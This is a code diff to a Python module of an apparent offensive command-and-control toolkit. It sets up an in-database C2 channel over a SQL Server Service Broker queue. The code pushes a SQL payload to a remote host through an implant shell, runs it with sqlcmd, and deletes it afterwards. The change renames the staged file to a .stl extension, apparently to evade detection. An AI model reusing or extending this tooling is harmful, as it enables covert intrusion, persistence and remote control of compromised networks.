@@ -14,7 +14,7 @@ class XpAgentMixin:
     """In-DB C2 channel via xpagent Service Broker queue on IIS01."""
 
     def cmd_xpagent_init(self, shell, timeout_s: int = 60):
-        """Stage xpagent_init.sql to WS01 via ToneShell FILE_DOWNLOAD and run via sqlcmd -i."""
+        """Stage xpagent_init.sql to WS01 as xpagent_init.stl via ToneShell FILE_DOWNLOAD and run via sqlcmd -i."""
         src = os.path.join(_SQL_DIR, "xpagent_init.sql")
         dst = os.path.join(_PAYLOADS_DIR, "xpagent_init.sql")
         try:
@@ -22,10 +22,10 @@ class XpAgentMixin:
         except OSError as e:
             print(f"[!] xpagent_init: cannot copy to payloads dir: {e}")
             return
-        remote_sql = r"C:\Windows\Temp\xpagent_init.sql"
+        remote_sql = r"C:\Windows\Temp\xpagent_init.stl"
         print("[*] xpagent_init: pushing SQL to WS01 ...")
         shell.cmd_put_wait("xpagent_init.sql", remote_sql)
-        print("[*] xpagent_init: running xpagent_init.sql on IIS01 ...")
+        print("[*] xpagent_init: running xpagent_init.stl on IIS01 ...")
         out = shell.cmd_exec_raw(f"{self._sqlcmd_prefix()} -i {remote_sql}", timeout_s=timeout_s)
         print(out)
         shell.cmd_exec_raw(f"cmd /c del /f {remote_sql}")
